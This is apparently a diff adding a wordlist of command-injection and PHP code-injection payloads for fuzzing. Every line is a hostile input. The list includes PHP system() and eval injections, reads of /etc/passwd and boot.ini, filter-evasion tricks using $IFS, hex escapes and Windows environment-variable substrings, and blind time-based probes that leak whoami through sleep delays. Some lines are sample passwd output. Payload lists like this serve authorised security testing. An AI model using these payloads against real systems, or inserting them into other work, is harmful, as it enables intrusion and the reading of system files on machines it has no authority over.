@@ -1,0 +1,34 @@
+;${@print(md5(RCEVulnerable))}
+;${@print("RCEVulnerable")}
+${@print(system($_SERVER['HTTP_USER_AGENT']))}
+;{$_GET["cmd"]}
+;uname;
+&&dir
+&&type C:\\boot.ini
+;phpinfo();
+:phpversion();
+;cat /etc/passwd
+&&root:x:0:0:root:/root:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh]
+&&bin:x:2:2:bin:/bin:/bin/sh
+X=$'uname\x20-a'&&$X
+;X=$'uname\x20-a'&&$X
+ping%CommonProgramFiles:~10,-18%IP
+ping%PROGRAMFILES:~10,-5%IP
+&&ping%CommonProgramFiles:~10,-18%IP
+;ping%PROGRAMFILES:~10,-5%IP
+IFS=,;`cat<<<uname,-a`
+&&IFS=,;`cat<<<uname,-a`
+;IFS=,;`cat<<<uname,-a`
+time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+&&time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+;time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+who$@ami
+&&who$@ami
+;who$@ami
+cat$IFS/etc/passwd
+;cat$IFS/etc/passwd
+&&cat$IFS/etc/passwd'
